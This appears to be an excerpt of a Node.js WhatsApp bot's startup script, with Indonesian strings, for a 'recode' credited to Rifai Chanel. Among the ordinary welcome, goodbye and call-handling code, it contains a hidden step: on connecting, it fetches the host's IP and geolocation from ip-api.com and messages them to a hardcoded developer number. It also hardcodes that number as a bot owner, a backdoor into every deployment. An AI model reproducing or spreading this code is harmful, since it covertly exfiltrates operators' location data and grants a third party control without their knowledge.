...
nocache('./RifaiChanel.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))

async function starts() {
pemuda.autoReconnect = ReconnectMode.onConnectionLost
    pemuda.version = [ 2, 2143, 3 ]
    pemuda.logger.level = 'warn'
    pemuda.browserDescription = ['Rifai Chanel','Desktop','3.0']
    await sleep(7000)
    pemuda.on('qr', qr => {
 ...
 teks = `https://chat.whatsapp.com/DLdisEbyeb650R2e6AZ383`//KALO DI GANTI AUTO EROR!
 ...
 pemuda.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(pemuda.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Rifai Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/6287834324804?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       pemuda.sendMessage("6287834324804@s.whatsapp.net", `─────「 *HALO BANG* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Rifai Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/6287834324804?text=Assalamualaikum"}}})
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   pemuda.on('chat-update', async (mek) => {
        require('./RifaiChanel.js')(pemuda, mek)
        ownerNumber = ["6287834324804@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "6287834324804@s.whatsapp.net"
...
pemuda.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
		    ...
		    pemuda.sendMessage(mdata.id, masuk, MessageType.text, { quoted: fkontakk, thumbnail: fs.readFileSync('./pemuda_1.jpg'), contextInfo: { forwardingScore: 567308, isForwarded: true, externalAdReply:{title: `Welcome To ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,mediaUrl:`https://hadi-api.herokuapp.com/`}}})
			...
			let buff = await getBuffer(ppimg)
			keluarkan =`Yah Malah Keluar😣\nSelamat tinggal @${num.split('@')[0]}\nSemoga Kamu Bahagia Di Sana:v`
		bumesss = [{buttonId: `!000`, buttonText: {displayText: 'Goodbye‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎'}, type: 1}]
			const Keluarlah = {
    contentText: `${keluarkan}`,
    footerText: `Leave  › ${mdata.subject}`,
    buttons: bumesss,
    headerType: 1
}
...
pemuda.on('CB:action,,call', async json => {
        ...
        pemuda.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:`https://wa.me/6287834324804?text=Assalamualaikum`}}})
        await sleep(5000)
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('Subcribe : Rifai Chanel', 'red'))})}, 200 ) ;
	}
	else
	{
...
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping('By Denis Putra - Recode by Rifai Chanel' ,{ flashStyle: term.brightWhite })
